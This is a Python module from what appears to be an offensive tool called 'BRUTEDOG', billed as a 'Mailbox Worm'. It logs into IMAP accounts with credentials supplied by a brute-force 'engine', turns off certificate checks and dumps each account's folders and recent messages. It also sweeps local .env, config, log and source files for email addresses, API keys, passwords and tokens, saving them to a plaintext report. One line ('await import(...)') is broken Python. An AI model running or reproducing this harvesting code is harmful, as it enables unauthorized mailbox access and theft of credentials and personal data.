import os
import re
import json
import time
import ssl
import imaplib
import urllib.request

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
    """Connects to a verified IMAP mailbox account and dumps folder structures & messages on the run."""
    dump_data = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": []
    }
    try:
        if use_ssl:
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=_ssl_context)
        else:
            mail = imaplib.IMAP4(host, port)
            
        mail.login(user, password)
        
        status, folders = mail.list()
        if status == 'OK':
            dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
            
        mail.select('INBOX', readonly=True)
        status, messages = mail.search(None, 'ALL')
        if status == 'OK':
            id_list = messages[0].split()
            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list # Grab recent 10 high-value messages
            
            for msg_id in recent_ids:
                res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
                if res == 'OK':
                    dump_data["harvested_messages"].append({
                        "msg_id": msg_id.decode(errors="ignore"),
                        "info": str(msg_data[0])
                    })
                    
        mail.logout()
        
        os.makedirs("reports/dumps", exist_ok=True)
        dump_path = f"reports/dumps/imap_dump_{user.replace('@', '_at_')}.json"
        with open(dump_path, "w") as f:
            json.dump(dump_data, f, indent=4)
            
        return True, dump_path
    except Exception as e:
        return False, str(e)

async def harvest_email_intelligence(target_host, verified_hits=None):
    """
    Pro Red-Team Intelligence & Mailbox Worm: 
    1. Worms through local files, configs, and caches for emails, tokens, and keys on the fly.
    2. Infiltrates live IMAP mailboxes if verified credentials are supplied by the engine.
    """
    print(f"\n\033[95m[***] ENGAGING AGGRESSIVE INTELLIGENCE & MAILBOX INFILTRATOR [{target_host}] [***]\033[0m")
    
    discovered_emails = set()
    discovered_credentials = []
    
    # 1. Active Web & Local Cache Scraping (Worming out configs, tokens, and keys)
    email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
    credential_regex = re.compile(r'(?:api[_-]?key|password|secret|token|auth)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
    
    local_search_paths = [".", "config", "reports"]
    for path in local_search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                skip_tokens = ["/tmp", "site-packages", "venv", ".git"]
                if any(token in root for token in skip_tokens):
                    continue
                for file in files:
                    if file.endswith(('.env', '.json', '.txt', '.conf', '.log', '.py')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                
                                # Extract emails
                                for match in email_regex.findall(content):
                                    if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
                                        discovered_emails.add(match)
                                        
                                # Extract inline API credentials / secrets
                                for cred in credential_regex.findall(content):
                                    if cred not in discovered_credentials:
                                        discovered_credentials.append(cred)
                                        print(f" \033[91m[+++] CREDENTIAL LEAK WORMED ON THE FLY: {cred[:10]}... (in {file_path})\033[0m")
                        except Exception:
                            pass

    # 2. Live IMAP Infiltrator (If verified credential hits exist from engine)
    if verified_hits:
        for hit in verified_hits:
            if hit.get("type") == "IMAP":
                user = hit.get("user")
                password = hit.get("password")
                port = hit.get("port", 993)
                use_ssl = (port in [993, 465])
                
                print(f" \033[93m[*] Infiltrating mailbox for {user} on :{port}...\033[0m")
                success, result = await import('asyncio').to_thread(
                    dump_imap_mailbox_sync, target_host, port, user, password, use_ssl
                )
                
                if success:
                    print(f" \033[92m[+] MAILBOX DUMPED SUCCESSFULLY -> Saved to {result}\033[0m")
                else:
                    print(f" \033[91m[-] Mailbox infiltration failed: {result}\033[0m")

    print(f" \033[92m[+] Intelligence sweep complete. Harvested unique emails: {len(discovered_emails)}\033[0m")
    
    # Save extracted intelligence to plaintext report
    os.makedirs("reports", exist_ok=True)
    report_path = "reports/intelligence_harvest.txt"
    with open(report_path, "w") as out:
        out.write("=== BRUTEDOG LIVE INTELLIGENCE & CREDENTIAL HARVEST ===\n")
        out.write("DISCOVERED EMAILS:\n")
        for email in sorted(discovered_emails):
            out.write(f" - {email}\n")
        out.write("\nDISCOVERED CREDENTIALS / TOKENS:\n")
        for cred in discovered_credentials:
            out.write(f" - {cred}\n")
            
    print(f" \033[92m[+] Plaintext intelligence report compiled and saved to {report_path}\033[0m")
    return list(discovered_emails)
